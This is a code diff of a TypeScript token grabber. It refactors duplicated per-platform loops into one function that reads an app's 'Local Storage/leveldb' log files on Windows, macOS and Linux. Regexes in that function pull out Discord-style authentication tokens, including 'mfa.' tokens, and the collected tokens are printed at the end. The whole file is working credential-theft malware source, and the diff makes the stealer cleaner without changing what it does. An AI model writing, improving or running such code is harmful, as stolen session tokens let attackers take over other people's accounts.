@@ -1,102 +1,60 @@
 const fs = require('fs');
 const path = require('path');
 
+const searchLogs = (tokenPath: string, tokens: string[]) => {
+    try {
+        fs.readdirSync(path.normalize(tokenPath)).map((file: string) => {
+            if (file.endsWith('.log') || file.endsWith('.ldb')) {
+                fs.readFileSync(`${tokenPath}\\${file}`, 'utf8')
+                    .split(/\r?\n/)
+                    .forEach((line: string) => {
+                        const regex = [
+                            new RegExp(/mfa\.[\w-]{84}/g),
+                            new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
+                        ];
+                        for (const _regex of regex) {
+                            const token = line.match(_regex);
+
+                            if (token) {
+                                token.forEach((element: string) => {
+                                    if (!tokens.includes(element)) {
+                                        tokens.push(element);
+                                    }
+                                });
+                            }
+                        }
+                    });
+            }
+        });
+    } catch (error) {
+        console.log(`=> No directory found for ${tokenPath}`);
+    }
+
+    return tokens;
+};
+
 const findToken = (tokenPath: string) => {
     const computerPlatform = process.platform;
 
     let tokens: string[] = [];
 
-    if (computerPlatform == 'win32') {
-        tokenPath += '\\Local Storage\\leveldb';
-
-        try {
-            fs.readdirSync(path.normalize(tokenPath)).map((file: string) => {
-                if (file.endsWith('.log') || file.endsWith('.ldb')) {
-                    fs.readFileSync(`${tokenPath}\\${file}`, 'utf8')
-                        .split(/\r?\n/)
-                        .forEach((line: string) => {
-                            const regex = [
-                                new RegExp(/mfa\.[\w-]{84}/g),
-                                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
-                            ];
-                            for (const _regex of regex) {
-                                const token = line.match(_regex);
-
-                                if (token) {
-                                    token.forEach((element: string) => {
-                                        if (!tokens.includes(element)) {
-                                            tokens.push(element);
-                                        }
-                                    });
-                                }
-                            }
-                        });
-                }
-            });
-        } catch (error) {
-            console.log(`=> No directory found for ${tokenPath}`);
-        }
-    } else if (computerPlatform == 'darwin') {
-        tokenPath += '/Local Storage/leveldb/';
-
-        try {
-            fs.readdirSync(path.normalize(tokenPath)).map((file: string) => {
-                if (file.endsWith('.log') || file.endsWith('.ldb')) {
-                    fs.readFileSync(`${tokenPath}/${file}`, 'utf8')
-                        .split(/\r?\n/)
-                        .forEach((line: string) => {
-                            const regex = [
-                                new RegExp(/mfa\.[\w-]{84}/g),
-                                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
-                            ];
-                            for (const _regex of regex) {
-                                const token = line.match(_regex);
-
-                                if (token) {
-                                    token.forEach((element: string) => {
-                                        tokens.push(element);
-                                    });
-                                }
-                            }
-                        });
-                }
-            });
-        } catch (error) {
-            console.log(`=> No directory found for ${tokenPath}`);
-        }
-    } else if (computerPlatform === 'linux') {
-        tokenPath += '/Default/Local Storage/leveldb/';
-
-        try {
-            fs.readdirSync(path.normalize(tokenPath)).map((file: string) => {
-                if (file.endsWith('.log') || file.endsWith('.ldb')) {
-                    fs.readFileSync(`${tokenPath}/${file}`, 'utf8')
-                        .split(/\r?\n/)
-                        .forEach((line: string) => {
-                            const regex = [
-                                new RegExp(/mfa\.[\w-]{84}/g),
-                                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
-                            ];
-                            for (const _regex of regex) {
-                                const token = line.match(_regex);
-
-                                if (token) {
-                                    token.forEach((element: string) => {
-                                        if (!tokens.includes(element)) {
-                                            tokens.push(element);
-                                        }
-                                    });
-                                }
-                            }
-                        });
-                }
-            });
-        } catch (error) {
-            if (error) {
-                console.log(`=> No directory found for ${tokenPath}`);
-            }
-        }
+    switch (computerPlatform) {
+        case 'win32':
+            tokenPath += '\\Local Storage\\leveldb';
+            searchLogs(tokenPath, tokens);
+            break;
+        case 'darwin':
+            tokenPath += '/Local Storage/leveldb/';
+            searchLogs(tokenPath, tokens);
+            break;
+        case 'linux':
+            tokenPath += '/Default/Local Storage/leveldb/';
+            searchLogs(tokenPath, tokens);
+            break;
+        default:
+            console.log(`=> ${computerPlatform} is not supported`);
     }
+
     return tokens;
 };
 
@@ -208,6 +166,8 @@ const findToken = (tokenPath: string) => {
             });
         }
     }
+
     console.log(tokens);
+
     return tokens;
 })();
